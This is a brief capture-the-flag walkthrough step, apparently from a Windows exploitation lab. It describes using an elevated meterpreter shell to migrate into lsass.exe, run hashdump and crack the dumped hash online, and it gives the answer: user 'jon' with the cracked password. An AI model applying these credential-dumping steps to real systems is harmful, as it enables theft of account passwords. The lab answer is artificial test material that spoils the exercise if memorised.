**Within our elevated meterpreter shell, run the command 'hashdump'. This will dump all of the passwords on the machine as long as we have the correct privileges to do so. What is the name of the non-default user?**
- Invoke `ps` to view all processes running on the **target machine**
- Look for `lsass.exe` PID which holds hashes for authorized users
- `Migrate <PID of lsass.exe` 
- `hashdump`
- Retrieve HASH -> Cracker Online -> `alqfna22`, User: `jon`


